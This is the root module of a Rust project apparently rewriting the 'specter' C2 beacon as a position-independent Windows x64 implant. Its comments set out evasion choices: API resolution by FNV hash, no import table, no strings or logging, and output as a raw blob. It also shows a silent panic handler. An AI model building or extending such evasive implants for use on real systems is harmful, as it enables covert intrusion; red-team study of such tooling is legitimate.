//! Specter-rs beacon — position-independent Windows x64 implant.
//!
//! Rust rewrite of https://github.com/Nariod/specter (`src_beacon`).
//!
//! Philosophy preserved from the original (all non-negotiable, see
//! docs/ETUDE-DE-FAISABILITE.md):
//!
//! - no CRT, no import table: every API is resolved at runtime by FNV-64 hash
//! - no globals: the instance lives in `TEB->NtTib.ArbitraryUserPointer` and
//!   is passed explicitly; fully reentrant
//! - single `.text` section via the link pipeline; the artifact is a raw blob
//!   extracted from the linked image
//! - no formatting, no logging, no unwinding

#![no_std]

pub mod coff;
pub mod entry;
pub mod net;
pub mod runtime;
pub mod tasks;

/// Fail as silently as the C beacon would: no unwinding, no messages, no
/// strings in the binary. When the nightly toolchain is pinned (phase 0
/// decision), `panic_immediate_abort` via build-std makes this unreachable.
#[panic_handler]
fn panic(_info: &core::panic::PanicInfo) -> ! {
    loop {}
}
